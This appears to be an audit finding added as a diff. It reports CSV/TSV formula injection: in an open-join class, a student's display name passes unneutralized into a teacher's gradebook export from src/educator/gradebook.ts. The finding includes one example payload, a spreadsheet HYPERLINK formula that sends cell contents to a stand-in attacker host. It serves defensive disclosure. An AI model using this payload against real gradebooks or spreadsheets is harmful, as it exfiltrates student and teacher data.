@@ -1,0 +1,6 @@
+# CSV/TSV formula injection via student-controlled display name (open-join class)
+Student self-names in an open-join class; only \t\n\r are stripped, leading =,+,-,@ survive.
+Stored roster displayName:
+["=HYPERLINK(\"http://evil.example/?\"&A1,\"g"]
+gradebookTsv (src/educator/gradebook.ts:227) only does: cell.replace(/[\t\n\r]+/g,' ') — no formula neutralization.
+-> Teacher 'Copy for a gradebook' -> paste into Excel/Sheets = live =HYPERLINK() formula.
